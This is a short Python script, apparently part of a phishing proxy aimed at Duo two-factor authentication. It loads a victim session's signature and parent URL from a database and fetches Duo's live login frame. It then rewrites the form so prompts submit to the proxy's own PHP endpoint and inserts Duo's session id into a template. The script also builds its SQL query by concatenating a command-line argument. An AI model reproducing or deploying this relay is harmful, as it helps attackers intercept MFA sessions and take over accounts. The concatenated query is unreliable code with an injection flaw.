#!/usr/bin/env python

"""
proxies.duo_validate_frame

~~~~~~~~~~~~~~

This file reads the mobile validate template and returns it after some modification

"""

import sys
import requests
from bs4 import BeautifulSoup
import lxml
import time
import json
from database import *


with open("../template/duo_validate_content.tpl") as f:
    content = f.read()


db = Database("proxy")



'''
vars:
    {{login-form}}
    {{sid}}
    {{sid_urlencode}}

'''

session_id = sys.argv[1]


data_dict = db.query_db_dict("SELECT * FROM `login_session` WHERE session_id = '"+session_id+"'")


sig = data_dict[0]["sig"]
url = data_dict[0]["url"]


headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36"}



s = requests.session()


auth_url = "https://api-f2c42ced.duosecurity.com/frame/web/v1/auth?tx="+sig+"&parent="+url+"&v=2.6"

data = {}

data["tx"] = sig
data["parent"] = url
data["referer"] = url

r = s.post(auth_url, data = data, headers = headers, allow_redirects = True)

bs4_string = BeautifulSoup(r.text, 'lxml')

login_form_text = str(bs4_string.find("form",{"id":"login-form"})).replace("/frame/prompt","../php/api/prompt")

content = content.replace("{{login-form}}", login_form_text)

sid_urlencode = r.url.split("sid=")[1]
sid = requests.utils.unquote(sid_urlencode)

content = content.replace("{{sid}}", sid)
content = content.replace("{{sid_urlencode}}", sid_urlencode)
print(content)












